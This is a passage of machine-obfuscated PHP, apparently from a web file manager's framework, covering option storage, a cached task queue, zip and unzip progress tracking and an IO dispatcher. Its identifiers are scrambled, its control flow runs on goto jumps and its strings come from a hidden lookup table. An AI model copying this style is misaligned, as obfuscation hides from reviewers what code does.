(is_array($bŠ…æÉ¢ƒÈ) && isset($bŠ…æÉ¢ƒÈ[0]) && is_string($bŠ…æÉ¢ƒÈ[0]) && strtolower($bŠ…æÉ¢ƒÈ[0]) == $AŒ•†ğŒ™[7] && is_array($bŠ…æÉ¢ƒÈ[1]) && count($bŠ…æÉ¢ƒÈ[1]) > $Eœôá›É) { ignore_timeout(); return $E’à¡Ï”‘Ë; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\x6d\x4f\x70\164\151\x6f\x6e"; public $field = array(); public function listData($CñËÁ›º¢¾ = false, $Eğ‡‡Ø = "\155\x6f\x64\151\146\171\x54\x69\155\145", $a·§Õë = false) { $C¢Ï‘×Âî‹ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$C¢Ï‘×Âî‹) { return $CñËÁ›º¢¾ ? null : array(); } if (!$CñËÁ›º¢¾) { $C¢Ï‘×Âî‹ = array_filter(array_values($C¢Ï‘×Âî‹)); return array_sort_by($C¢Ï‘×Âî‹, $Eğ‡‡Ø, $a·§Õë); } return $C¢Ï‘×Âî‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][382] . $CñËÁ›º¢¾]; } public function insert($D»¿çô·î¶) { goto d¦àÄ´¿îĞ; E‹ëëö§µÄ: $D»¿çô·î¶[$B†»¦¶–æ¯[83]] = time(); Model($this->modelType)->set($B†»¦¶–æ¯[383], $Fá“ˆÒÕÌÓ, $this->optionType . $B†»¦¶–æ¯[384]); Model($this->modelType)->set($B†»¦¶–æ¯[382] . $Fá“ˆÒÕÌÓ, $D»¿çô·î¶, $this->optionType); goto A«âƒ°¢„‹; A«âƒ°¢„‹: return $Fá“ˆÒÕÌÓ; goto aö©Ç»¬…; d¦àÄ´¿îĞ: $B†»¦¶–æ¯ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D»¿çô·î¶ = array_field_key($D»¿çô·î¶, $this->field); $Fá“ˆÒÕÌÓ = Model($this->modelType)->get($B†»¦¶–æ¯[383], $this->optionType . $B†»¦¶–æ¯[384]); goto C—‡·¥¸‰; C—‡·¥¸‰: $Fá“ˆÒÕÌÓ = $Fá“ˆÒÕÌÓ ? $Fá“ˆÒÕÌÓ : 0; $D»¿çô·î¶[$B†»¦¶–æ¯[385]] = ++$Fá“ˆÒÕÌÓ; $D»¿çô·î¶[$B†»¦¶–æ¯[192]] = time(); goto E‹ëëö§µÄ; aö©Ç»¬…: } public function update($a¾–Á®¬Î, $CÑ—åÀœÓ©) { goto f”ñ¡­¥‹; d¼ë•îçß‹: if (!$b¢Š÷ª†Š) { return !1; } $CÑ—åÀœÓ© = array_merge($b¢Š÷ª†Š, $CÑ—åÀœÓ©); $CÑ—åÀœÓ©[$b»ÌåØ‹Î[83]] = time(); goto f•ÏâëÚ³ë; f•ÏâëÚ³ë: return Model($this->modelType)->set($b»ÌåØ‹Î[382] . $a¾–Á®¬Î, $CÑ—åÀœÓ©, $this->optionType); goto b•²¬¹½; f”ñ¡­¥‹: $b»ÌåØ‹Î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÑ—åÀœÓ© = array_field_key($CÑ—åÀœÓ©, $this->field); $b¢Š÷ª†Š = $this->listData($a¾–Á®¬Î); goto d¼ë•îçß‹; b•²¬¹½: } public function remove($f×¨Æƒ¤¦Î) { return Model($this->modelType)->remove($_SERVER[ó¬â¥‰ÊÔ¤Ç£][382] . $f×¨Æƒ¤¦Î, $this->optionType); } public function clear() { $FšÙ œèè =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; Model($this->modelType)->remove($FšÙ œèè[383], $this->optionType . $FšÙ œèè[384]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($cÁÖÛé¦, $c‘ˆ‡Œƒœ) { if (!$c‘ˆ‡Œƒœ) { return !1; } $B§½ìèÙœË = $this->listData(); $B§½ìèÙœË = array_to_keyvalue($B§½ìèÙœË, $cÁÖÛé¦); return isset($B§½ìèÙœË[$c‘ˆ‡Œƒœ]) ? $B§½ìèÙœË[$c‘ˆ‡Œƒœ] : !1; } public function findByName($b¨ŠÜÂ›ø) { return $this->findByKey($_SERVER[ó¬â¥‰ÊÔ¤Ç£][28], $b¨ŠÜÂ›ø); } protected function resetData($B‰˜Ê î©Ú) { $B§Ó™ã®˜ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B‰˜Ê î©Ú = is_array($B‰˜Ê î©Ú) ? $B‰˜Ê î©Ú : array(); $bÜ‘Ã«¤Ê = array(); for ($bÊÆ·Åù‡¢ = 0; $bÊÆ·Åù‡¢ < count($B‰˜Ê î©Ú); $bÊÆ·Åù‡¢++) { $bÜ‘Ã«¤Ê[$B§Ó™ã®˜ƒ[382] . $B‰˜Ê î©Ú[$bÊÆ·Åù‡¢][$B§Ó™ã®˜ƒ[385]]] = $B‰˜Ê î©Ú[$bÊÆ·Åù‡¢]; } return Model($this->modelType)->set($bÜ‘Ã«¤Ê, !1, $this->optionType); } private function getAutoName($bĞØî¤ºğ«) { $B·Ï¿ƒºØ¿ = array_to_keyvalue($this->listData(), $_SERVER[ó¬â¥‰ÊÔ¤Ç£][28]); if (!$B·Ï¿ƒºØ¿ || !isset($B·Ï¿ƒºØ¿[$bĞØî¤ºğ«])) { return $bĞØî¤ºğ«; } for ($b“Ğ¥“…±İ = 1; $b“Ğ¥“…±İ < count($B·Ï¿ƒºØ¿); $b“Ğ¥“…±İ++) { $CÎ”šÁ³Ù = $bĞØî¤ºğ« . "\x28{$b“Ğ¥“…±İ}\x29"; if (!isset($B·Ï¿ƒºØ¿[$CÎ”šÁ³Ù])) { return $CÎ”šÁ³Ù; } } return $CÎ”šÁ³Ù; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($BÎ˜ êÓŸ… = false, $BêôğĞÛ© = '', $E¯İ‰´ÓÁ· = false) { goto cÒÅ‰‰ÆÒ; FŒØöìÌĞ: $this->cacheSet($BêôğĞÛ©, $a‡å¯·ì†Å); $a‡å¯·ì†Å = array_merge($e¿š×°™…, $a‡å¯·ì†Å); return $BÎ˜ êÓŸ… ? $a‡å¯·ì†Å[$BÎ˜ êÓŸ…] : $a‡å¯·ì†Å; goto eğê¥™Ï¿; FÓŸ„Ïâà: $e¿š×°™… = is_array($e¿š×°™…) ? $e¿š×°™… : array(); if (is_array($a‡å¯·ì†Å)) { $a‡å¯·ì†Å = array_merge($e¿š×°™…, $a‡å¯·ì†Å); return $BÎ˜ êÓŸ… ? isset($a‡å¯·ì†Å[$BÎ˜ êÓŸ…]) ? $a‡å¯·ì†Å[$BÎ˜ êÓŸ…] : null : $a‡å¯·ì†Å; } $D†ºææêë = $this->filterWhere(array($eÄØ±öËï—[29] => $BêôğĞÛ©)); goto d•Ôİ‘Áƒ»; cÒÅ‰‰ÆÒ: $eÄØ±öËï— =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a‡å¯·ì†Å = $this->cacheGet($BêôğĞÛ©); $e¿š×°™… = $this->optionDefault($BêôğĞÛ©); goto FÓŸ„Ïâà; d•Ôİ‘Áƒ»: $a‡å¯·ì†Å = $this->where($D†ºææêë)->select(); $a‡å¯·ì†Å = array_to_keyvalue($a‡å¯·ì†Å, $eÄØ±öËï—[92], $eÄØ±öËï—[368]); foreach ($a‡å¯·ì†Å as $Aò£Ú¹¨¬¸ => $DŠ¡ã ¼‡Û) { if ($E¯İ‰´ÓÁ· || in_array($Aò£Ú¹¨¬¸, $this->jsonField)) { $a‡å¯·ì†Å[$Aò£Ú¹¨¬¸] = json_decode($DŠ¡ã ¼‡Û, !0); } } goto FŒØöìÌĞ; eğê¥™Ï¿: } public function set($d¤©ÚÇˆ³, $eë‹ñéà· = false, $Fà‚®’«ß = '') { goto Dêö×÷½—«; aìÛ¢ò¯á¨: $BëªëØÄØ½ = is_array($d¤©ÚÇˆ³) ? $d¤©ÚÇˆ³ : array($d¤©ÚÇˆ³ => $eë‹ñéà·); foreach ($BëªëØÄØ½ as $C¡œÛ²ùÀ™ => $dÚ†Í¿›¯—) { if (is_array($dÚ†Í¿›¯—)) { $dÚ†Í¿›¯— = json_encode_force($dÚ†Í¿›¯—); } $this->checkLength($dÚ†Í¿›¯—, !1, $this->tableName . $cäŞÄ¬½ë¾[4] . $d¤©ÚÇˆ³); $dÚ†Í¿›¯— = self::textEncode($dÚ†Í¿›¯—); $BëªëØÄØ½ = array($cäŞÄ¬½ë¾[29] => $Fà‚®’«ß, $cäŞÄ¬½ë¾[92] => $C¡œÛ²ùÀ™, $cäŞÄ¬½ë¾[368] => $dÚ†Í¿›¯—); $c„ñ˜´ÀÄ–[] = $this->filterWhere($BëªëØÄØ½); } if (!$c„ñ˜´ÀÄ–) { return !0; } goto Aé¦ÛŠÔË·; Dêö×÷½—«: $cäŞÄ¬½ë¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->cacheRemove($Fà‚®’«ß); $c„ñ˜´ÀÄ– = array(); goto aìÛ¢ò¯á¨; Aé¦ÛŠÔË·: return $this->addAll($c„ñ˜´ÀÄ–, array(), !0); goto FĞ·Œà—Ÿ‰; FĞ·Œà—Ÿ‰: } protected function optionDefault($Bà«¸¦ËŞ = '') { return !1; } public function setDeep($E¾º‰½éî, $Cßä·š´±¤ = false, $Fïí¶ÑÄ—Ñ = '') { $e‡ÁŠò¯‡ç = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][94], $E¾º‰½éî); $EÄ‚¬ˆ‰ÑĞ = $this->get(); array_set_value($EÄ‚¬ˆ‰ÑĞ, $E¾º‰½éî, $Cßä·š´±¤); $this->set($e‡ÁŠò¯‡ç[0], $EÄ‚¬ˆ‰ÑĞ[$e‡ÁŠò¯‡ç[0]], $Fïí¶ÑÄ—Ñ); } public function remove($BÂÒ¡óÑä, $b•„Õ»ƒŸ‹ = '') { $eÕÑÍ‘½Ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->cacheRemove($b•„Õ»ƒŸ‹); $Cã·é½ßéï = $this->filterWhere(array($eÕÑÍ‘½Ç[92] => $BÂÒ¡óÑä, $eÕÑÍ‘½Ç[29] => $b•„Õ»ƒŸ‹)); if (is_null($BÂÒ¡óÑä)) { unset($Cã·é½ßéï[$eÕÑÍ‘½Ç[92]]); } return $this->where($Cã·é½ßéï)->delete(); } public function cacheSet($Cò“š¿”¶, $d­‘ñª¡œó = false) { return Cache::set($this->cacheKey($Cò“š¿”¶), $d­‘ñª¡œó); } public function cacheGet($d´øØ²íÙ‡) { return Cache::get($this->cacheKey($d´øØ²íÙ‡)); } public function cacheRemove($B«§Ç™³İ) { return Cache::remove($this->cacheKey($B«§Ç™³İ)); } protected function filterWhere($aï³˜ˆ¼Øì) { return $aï³˜ˆ¼Øì; } protected function cacheKey($dë¢òæÛ¥Ã) { return $dë¢òæÛ¥Ã; } } goto cØ‘˜Âß§Œ; Bì÷é‘ñé: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\163\x6b\121\165\x65\165\x65\x4c\145\156\147\x74\x68"; const QUEUE_DATA = "\x74\141\x73\x6b\x51\165\x65\165\145\x44\141\164\141"; public static function initTask() { } public static function add($aã§„™ÌÓæ, $c™‹±õªó« = array(), $Aïª¶‡ÄÏÜ = '', $câÏ¢Æ¬‡ë = '') { goto Eô‹›–—²õ; Eô‹›–—²õ: $dÔ‘ÏäÀŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (self::count() >= self::MAX_LENGTH) { return !1; } $b© ˆŒ¼© = self::getAll(); goto fù·ÆÃøŞ¦; fŞõªŸ›àÍ: self::setAll($b© ˆŒ¼©); return !0; goto D·ã è–Í; fù·ÆÃøŞ¦: if ($câÏ¢Æ¬‡ë && array_find_by_field($b© ˆŒ¼©, $dÔ‘ÏäÀŒ[92], $câÏ¢Æ¬‡ë)) { return !0; } $b© ˆŒ¼©[] = array($dÔ‘ÏäÀŒ[260] => $aã§„™ÌÓæ, $dÔ‘ÏäÀŒ[1550] => $c™‹±õªó«, $dÔ‘ÏäÀŒ[422] => $Aïª¶‡ÄÏÜ, $dÔ‘ÏäÀŒ[92] => $câÏ¢Æ¬‡ë); write_log($dÔ‘ÏäÀŒ[1551] . $Aïª¶‡ÄÏÜ, $dÔ‘ÏäÀŒ[1552]); goto fŞõªŸ›àÍ; D·ã è–Í: } public static function run() { goto F†øŠ†ï‚”; aŞá‚š“±Š: try { $c©¶ª‘ÕÕ = Hook::apply($e®”êçù“„[$cÙâĞ¯¼„¾[260]], $e®”êçù“„[$cÙâĞ¯¼„¾[1550]]); } catch (Exception $cˆà˜­) { } write_log($cÙâĞ¯¼„¾[1554] . $e®”êçù“„[$cÙâĞ¯¼„¾[422]], $cÙâĞ¯¼„¾[1552]); return !0; goto Bë£–ƒ¯ğ; F†øŠ†ï‚”: $cÙâĞ¯¼„¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A•‹äŞÃ»Ç = self::getAll(); $e®”êçù“„ = array_shift($A•‹äŞÃ»Ç); goto Eœ±ëŒ«¿; Eœ±ëŒ«¿: if (!$e®”êçù“„) { return !1; } self::setAll($A•‹äŞÃ»Ç); write_log($cÙâĞ¯¼„¾[1553] . $e®”êçù“„[$cÙâĞ¯¼„¾[422]], $cÙâĞ¯¼„¾[1552]); goto aŞá‚š“±Š; Bë£–ƒ¯ğ: } public static function count() { $d¥ˆÏíæ©ò = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$d¥ˆÏíæ©ò) { return 0; } return intval($d¥ˆÏíæ©ò); } public static function getAll() { $DÇ§¶²œ« = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$DÇ§¶²œ«) { return array(); } return $DÇ§¶²œ«; } public static function setAll($cŠÕØèØÊÑ) { $a¾éá×ÜÃ£ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($cŠÕØèØÊÑ), $a¾éá×ÜÃ£); Cache::set(self::QUEUE_DATA, $cŠÕØèØÊÑ, $a¾éá×ÜÃ£); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto D‡èÓÃ‘—·; cš—öªç«: if (!$Dµ„£°­Ä×[$A’‡”éˆ¦é[1384]]) { $Dµ„£°­Ä×[$A’‡”éˆ¦é[1384]] = LNG($A’‡”éˆ¦é[1559]); } goto bâæ÷›ŒÃ«; D‰åà’Íª·: Hook::bind($A’‡”éˆ¦é[1040], array($this, $A’‡”éˆ¦é[1557])); $Dµ„£°­Ä× =& $this->task; $Dµ„£°­Ä×[$A’‡”éˆ¦é[1558]] = $A’‡”éˆ¦é[1045]; goto cš—öªç«; D‡èÓÃ‘—·: $A’‡”éˆ¦é =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; parent::startAfter(); Hook::bind($A’‡”éˆ¦é[1555], array($this, $A’‡”éˆ¦é[1556])); goto D‰åà’Íª·; bâæ÷›ŒÃ«: } protected function endAfter() { $dñ…‹¹¦ê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; parent::endAfter(); Hook::unbind($dñ…‹¹¦ê[1555], array($this, $dñ…‹¹¦ê[1556])); Hook::unbind($dñ…‹¹¦ê[1040], array($this, $dñ…‹¹¦ê[1557])); } public function updateAfter() { $E ²¬›¶èõ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A¥Ÿ†áç =& $this->task; if (!$A¥Ÿ†áç[$E ²¬›¶èõ[973]] || !$A¥Ÿ†áç[$E ²¬›¶èõ[692]]) { return; } if ($A¥Ÿ†áç[$E ²¬›¶èõ[1558]] == $E ²¬›¶èõ[1045]) { $a…ŒÏÊëî = 0; if ($A¥Ÿ†áç[$E ²¬›¶èõ[1524]]) { $a…ŒÏÊëî = $A¥Ÿ†áç[$E ²¬›¶èõ[1525]] / $A¥Ÿ†áç[$E ²¬›¶èõ[1524]]; } $A¥Ÿ†áç[$E ²¬›¶èõ[1480]] = $a…ŒÏÊëî * 0.3; } else { if ($A¥Ÿ†áç[$E ²¬›¶èõ[1558]] == $E ²¬›¶èõ[309]) { $a…ŒÏÊëî = $A¥Ÿ†áç[$E ²¬›¶èõ[987]] / $A¥Ÿ†áç[$E ²¬›¶èõ[973]]; $A¥Ÿ†áç[$E ²¬›¶èõ[1480]] = 0.3 + $a…ŒÏÊëî * 0.4; } else { if ($A¥Ÿ†áç[$E ²¬›¶èõ[1558]] == $E ²¬›¶èõ[106]) { $d•Ôµöì™â = 0; if ($A¥Ÿ†áç[$E ²¬›¶èõ[1526]] == $E ²¬›¶èõ[106]) { $d•Ôµöì™â = $A¥Ÿ†áç[$E ²¬›¶èõ[1525]]; } $a…ŒÏÊëî = ($A¥Ÿ†áç[$E ²¬›¶èõ[1529]] + $d•Ôµöì™â) / $A¥Ÿ†áç[$E ²¬›¶èõ[692]]; $A¥Ÿ†áç[$E ²¬›¶èõ[1480]] = 0.3 + 0.4 + $a…ŒÏÊëî * 0.3; } } } if ($A¥Ÿ†áç[$E ²¬›¶èõ[1480]] > 0) { $aàÛÀˆ÷‚ä = timeFloat() - $A¥Ÿ†áç[$E ²¬›¶èõ[1482]] - $A¥Ÿ†áç[$E ²¬›¶èõ[1485]]; $A¥Ÿ†áç[$E ²¬›¶èõ[1486]] = $aàÛÀˆ÷‚ä * (1 - $A¥Ÿ†áç[$E ²¬›¶èõ[1480]]) / $A¥Ÿ†áç[$E ²¬›¶èõ[1480]]; } } public function addFile($D¶ïÓ‚÷Ë˜) { goto dì»Ê¿øµ”; föò­ø©®: $this->update(); goto Cİ˜¤¹ÄÃÁ; dì»Ê¿øµ”: $a™ôÛç…¨¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÄ»ç›ÑƒÇ =& $this->task; $cŞµÅÄºÜÒ = IO::info($D¶ïÓ‚÷Ë˜); goto f…‰¾ŸÏ¦; f…‰¾ŸÏ¦: $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[1522]] = $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[28]]; $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[1524]] = $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[77]]; $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[1525]] = 0; goto B÷Â§­ãï; fšŞÌŒ¤–†: $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[973]] = 1; $FŸ“Õá’¥ = 0; $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[1533]] = array($a™ôÛç…¨¢[1534] => $FŸ“Õá’¥ + 1, $a™ôÛç…¨¢[404] => $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[28]], $a™ôÛç…¨¢[75] => $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[75]], $a™ôÛç…¨¢[484] => $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[484]] ? $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[484]] : $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[75]]); goto föò­ø©®; B÷Â§­ãï: $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[975]] = $a™ôÛç…¨¢[1541]; $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[1526]] = $a™ôÛç…¨¢[1045]; $cÄ»ç›ÑƒÇ[$a™ôÛç…¨¢[692]] = $cŞµÅÄºÜÒ[$a™ôÛç…¨¢[77]]; goto fšŞÌŒ¤–†; Cİ˜¤¹ÄÃÁ: } public function unzipAfter($eë“¢¼ö¡Î) { goto aÌš®„‰Ã; aÌš®„‰Ã: $Fì ¸ãæôğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÒ¡†•†Ó =& $this->task; $bÒ¡†•†Ó[$Fì ¸ãæôğ[1558]] = $Fì ¸ãæôğ[106]; goto fï°ïòº“£; EµğÖšó Ç: if ($aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[29]] == $Fì ¸ãæôğ[173]) { $bÒ¡†•†Ó[$Fì ¸ãæôğ[973]] = 1; } else { $bÒ¡†•†Ó[$Fì ¸ãæôğ[973]] = $aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[80]][$Fì ¸ãæôğ[78]]; } $bÒ¡†•†Ó[$Fì ¸ãæôğ[975]] = $Fì ¸ãæôğ[33]; $bÒ¡†•†Ó[$Fì ¸ãæôğ[1526]] = 0; goto Bâ’„ÙÑÌë; fï°ïòº“£: $aÀ¦Â¢ë¬› = IO::infoWithChildren($eë“¢¼ö¡Î); $CÚñ­Á¶ = 0; $bÒ¡†•†Ó[$Fì ¸ãæôğ[1533]] = array($Fì ¸ãæôğ[1534] => $CÚñ­Á¶ + 1, $Fì ¸ãæôğ[404] => $aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[28]], $Fì ¸ãæôğ[75] => $aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[75]], $Fì ¸ãæôğ[484] => $aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[484]] ? $aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[484]] : $aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[75]]); goto EµğÖšó Ç; Bâ’„ÙÑÌë: $bÒ¡†•†Ó[$Fì ¸ãæôğ[987]] = 0; $bÒ¡†•†Ó[$Fì ¸ãæôğ[1524]] = 0; $bÒ¡†•†Ó[$Fì ¸ãæôğ[1525]] = 0; goto dÜØß Œ‚¤; eëø¤ğé§Ì: $this->update(); self::log($Fì ¸ãæôğ[1560] . json_encode(array($bÒ¡†•†Ó, $aÀ¦Â¢ë¬›))); goto dè®–ŞÖâÉ; dÜØß Œ‚¤: $bÒ¡†•†Ó[$Fì ¸ãæôğ[1522]] = $Fì ¸ãæôğ[33]; $bÒ¡†•†Ó[$Fì ¸ãæôğ[1529]] = 0; $bÒ¡†•†Ó[$Fì ¸ãæôğ[692]] = $aÀ¦Â¢ë¬›[$Fì ¸ãæôğ[77]]; goto eëø¤ğé§Ì; dè®–ŞÖâÉ: } public function nameParse($eÌ—— óí²) { goto aÓîùßÕ¹ê; a¼¡Û›Ø‘ß: $AèÚÏâğ© = get_path_this($eÌ—— óí²); if (strstr($AèÚÏâğ©, $BÊÑñ½„äœ[94])) { $B«½…¯“—[$BÊÑñ½„äœ[987]] += 1; $B«½…¯“—[$BÊÑñ½„äœ[973]] += 1; } $B«½…¯“—[$BÊÑñ½„äœ[1522]] = $eÌ—— óí²; goto a¡ÛÊîÇŒî; a¡ÛÊîÇŒî: $this->update(); goto BÏÌµŞŞŸô; aÓîùßÕ¹ê: $BÊÑñ½„äœ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B«½…¯“— =& $this->task; if ($B«½…¯“—[$BÊÑñ½„äœ[1558]] == $BÊÑñ½„äœ[1045]) { $B«½…¯“—[$BÊÑñ½„äœ[1558]] = $BÊÑñ½„äœ[309]; $B«½…¯“—[$BÊÑñ½„äœ[1529]] = 0; $B«½…¯“—[$BÊÑñ½„äœ[692]] = 0; } goto a¼¡Û›Ø‘ß; BÏÌµŞŞŸô: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $aô¦ÈÆ±Õ  =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; parent::startAfter(); Hook::bind($aô¦ÈÆ±Õ [1561], array($this, $aô¦ÈÆ±Õ [1556])); $AªÌÛŸ‰¿ =& $this->task; $AªÌÛŸ‰¿[$aô¦ÈÆ±Õ [1558]] = $aô¦ÈÆ±Õ [1045]; if (!$AªÌÛŸ‰¿[$aô¦ÈÆ±Õ [1384]]) { $AªÌÛŸ‰¿[$aô¦ÈÆ±Õ [1384]] = LNG($aô¦ÈÆ±Õ [1562]); } } protected function endAfter() { $DÎ¾ù®İ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; parent::endAfter(); Hook::unbind($DÎ¾ù®İ[1561], array($this, $DÎ¾ù®İ[1556])); } public function updateAfter() { $F˜·©¡à³ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÍ¥ôÏš¿¤ =& $this->task; if (!$eÍ¥ôÏš¿¤[$F˜·©¡à³[973]] || !$eÍ¥ôÏš¿¤[$F˜·©¡à³[692]]) { return; } if ($eÍ¥ôÏš¿¤[$F˜·©¡à³[1558]] == $F˜·©¡à³[1045]) { $CÔ¤¢øİËÑ = $eÍ¥ôÏš¿¤[$F˜·©¡à³[1525]]; if ($eÍ¥ôÏš¿¤[$F˜·©¡à³[1526]] != $F˜·©¡à³[1045]) { $CÔ¤¢øİËÑ = 0; } $B†êÁ™Ñ» = ($eÍ¥ôÏš¿¤[$F˜·©¡à³[1529]] + $CÔ¤¢øİËÑ) / $eÍ¥ôÏš¿¤[$F˜·©¡à³[692]]; $eÍ¥ôÏš¿¤[$F˜·©¡à³[1480]] = $B†êÁ™Ñ» * 0.3; } else { if ($eÍ¥ôÏš¿¤[$F˜·©¡à³[1558]] == $F˜·©¡à³[309]) { $B†êÁ™Ñ» = $eÍ¥ôÏš¿¤[$F˜·©¡à³[987]] / $eÍ¥ôÏš¿¤[$F˜·©¡à³[973]]; $eÍ¥ôÏš¿¤[$F˜·©¡à³[1480]] = 0.3 + $B†êÁ™Ñ» * 0.5; } else { if ($eÍ¥ôÏš¿¤[$F˜·©¡à³[1558]] == $F˜·©¡à³[106]) { $B†êÁ™Ñ» = 0; if ($eÍ¥ôÏš¿¤[$F˜·©¡à³[1524]]) { $B†êÁ™Ñ» = $eÍ¥ôÏš¿¤[$F˜·©¡à³[1525]] / $eÍ¥ôÏš¿¤[$F˜·©¡à³[1524]]; } $eÍ¥ôÏš¿¤[$F˜·©¡à³[1480]] = 0.3 + 0.5 + $B†êÁ™Ñ» * 0.2; } } } if ($eÍ¥ôÏš¿¤[$F˜·©¡à³[1480]] > 0) { $C¶ì„‡Ê©„ = timeFloat() - $eÍ¥ôÏš¿¤[$F˜·©¡à³[1482]] - $eÍ¥ôÏš¿¤[$F˜·©¡à³[1485]]; $eÍ¥ôÏš¿¤[$F˜·©¡à³[1486]] = $C¶ì„‡Ê©„ * (1 - $eÍ¥ôÏš¿¤[$F˜·©¡à³[1480]]) / $eÍ¥ôÏš¿¤[$F˜·©¡à³[1480]]; } } public function copyFileStart($A¨Á˜‘µÕÔ, $fÇµÆâÊ®, $FÄ„÷ˆ–˜™, $BŠ³¥¾ˆŠœ, $añºÛÎ›„…, $e”Æó˜£à†) { $c­êĞºåç§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; parent::copyFileStart($A¨Á˜‘µÕÔ, $fÇµÆâÊ®, $FÄ„÷ˆ–˜™, $BŠ³¥¾ˆŠœ, $añºÛÎ›„…, $e”Æó˜£à†); $F‹¯¥¦óœÓ =& $this->task; if ($F‹¯¥¦óœÓ[$c­êĞºåç§[1558]] == $c­êĞºåç§[309]) { $F‹¯¥¦óœÓ[$c­êĞºåç§[1558]] = $c­êĞºåç§[106]; } $this->update(); } public function copyFileEnd($aŞ²¡ÄÈŒĞ, $e×é¢Û×Ô, $aé»Ë±­Ì, $C…ò›’‹Û‚, $Cİ‚ÁØˆ‘ô, $eùëÁøñÁ©) { $f‰œ®ùÑ« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÙì¬ÕİëÜ =& $this->task; $eÙì¬ÕİëÜ[$f‰œ®ùÑ«[1525]] = $eÙì¬ÕİëÜ[$f‰œ®ùÑ«[1524]]; $eÙì¬ÕİëÜ[$f‰œ®ùÑ«[1529]] += $eÙì¬ÕİëÜ[$f‰œ®ùÑ«[1524]]; $eÙì¬ÕİëÜ[$f‰œ®ùÑ«[1526]] = $f‰œ®ùÑ«[33]; $this->update(); } public function nameParse($D“Ó¶æ) { $Dõæì‘ò±‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CíŒÎ‰— =& $this->task; if ($CíŒÎ‰—[$Dõæì‘ò±‚[987]] < $CíŒÎ‰—[$Dõæì‘ò±‚[973]]) { $e¨ñ²¹ÉÍä = get_path_this($D“Ó¶æ); if (strstr($e¨ñ²¹ÉÍä, $Dõæì‘ò±‚[94])) { $CíŒÎ‰—[$Dõæì‘ò±‚[987]] += 1; } } if ($CíŒÎ‰—[$Dõæì‘ò±‚[1558]] == $Dõæì‘ò±‚[1045]) { $CíŒÎ‰—[$Dõæì‘ò±‚[1558]] = $Dõæì‘ò±‚[309]; } $CíŒÎ‰—[$Dõæì‘ò±‚[1522]] = $D“Ó¶æ; $this->update(); } } goto eåïõ‹¿›«; D«ŠŠÇÀé: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($EÁÏËïƒˆ™, $bõ‚İÛ÷¹) { goto FÍìÙ‹­©©; Aóö õÛ…: Hook::trigger($dËäĞ£­åß[995] . $EÁÏËïƒˆ™ . $dËäĞ£­åß[996], $BÓ„„ø¼˜); $dé›•ùôÊâ = self::driverMake($bõ‚İÛ÷¹[0]); if (method_exists($dé›•ùôÊâ, $EÁÏËïƒˆ™)) { $AºƒÖÉÜÁŠ = @call_user_func_array(array($dé›•ùôÊâ, $EÁÏËïƒˆ™), $bõ‚İÛ÷¹); } else { if (method_exists($dé›•ùôÊâ, $dËäĞ£­åß[997])) { $AºƒÖÉÜÁŠ = @call_user_func_array(array($dé›•ùôÊâ, $EÁÏËïƒˆ™), $bõ‚İÛ÷¹); } else { if (method_exists(self, $EÁÏËïƒˆ™)) { $AºƒÖÉÜÁŠ = @call_user_func_array(array(self, 